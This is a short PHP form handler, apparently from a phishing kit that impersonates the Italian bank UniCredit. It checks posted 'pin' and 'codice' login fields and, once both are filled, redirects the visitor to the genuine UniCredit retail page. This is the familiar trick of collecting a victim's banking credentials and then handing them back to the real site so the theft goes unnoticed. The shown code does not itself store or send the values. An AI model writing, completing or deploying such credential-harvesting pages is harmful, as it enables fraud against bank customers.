<?php
 
  if(isset($_POST["accedi"])) {
    
    if($_POST["pin"]=="" || $_POST["codice"]==""){
      
    }
    else{
      header("location:https://www.unicredit.it/it/privati.html");
    }
      
    
  }
?>